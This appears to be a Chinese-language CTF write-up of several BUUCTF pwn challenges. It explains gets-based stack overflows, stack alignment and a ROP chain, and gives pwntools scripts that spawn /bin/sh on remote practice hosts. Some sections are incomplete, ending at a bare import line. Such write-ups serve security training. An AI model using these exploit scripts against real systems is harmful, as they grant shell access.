1.test nc

直接nc即可

2.rip

发现gets这漏洞函数，然后再fun函数中发现调用了system(“/bin/sh”)，直接栈溢出返回妇fun函数的地址0x401186即可。
注意栈对齐找到 ret
脚本：

from pwn import *
#r= process(‘./pwn1’)
r = remote(‘node5.buuoj.cn’,25716)
binsh_addr = 0x401186
padding = 23
ret_addr = 0x0000000000401016
payload = b’a’*padding + p64(ret_addr)+p64(binsh_addr)
r.sendline(payload)
r.interactive()

检查后在ida中打开，在字符串发现cat flag test,找到函数位置然后检查偏移量，编写脚本（注意栈对齐）

from pwn import *

4.ciscn_2019_n_1

检查只发现只开nx保护，放入ida，在字符串界面发现cat flag 在func函数中，发现要用get函数覆盖到v2地址修改v2的值，然后编写脚本
脚本：
from pwn import *
r= remote(‘node5.buuoj.cn’,26476)
padding = 0x30-0x4
t_addr = p32(0x41348000)
payload = b’a’*padding + t_addr
r.sendline(payload)
r.interactive()

5.babyrop

检查后，打开ida发现system函数和binsh.找到溢出的，计算padding,因为是64位，需要寄存器传参，所以要找到pop rdi，在rop中找到地址，随后在ida中找到system地址和binsh地址,构建脚本：
from pwn import *
context(arch=’amd64’, os=’linux’)
p= remote(‘node5.buuoj.cn’,29366)
#p= process(‘./bp’)
padding = 0x10 + 8
bin_ad = 0x601048
sys_ad = 0x400490
rdi_ad= 0x0000000000400683
ret_ad = 0x0000000000400479
payload = b’a’*padding + p64(rdi_ad)+p64(bin_ad)+p64(ret_ad)+ p64(sys_ad)
p.sendline(payload)
p.interactive()
记得对齐，随后在远端进行find-name flag,找到地址后 重新进入输入即可找到flag

from pwn import *
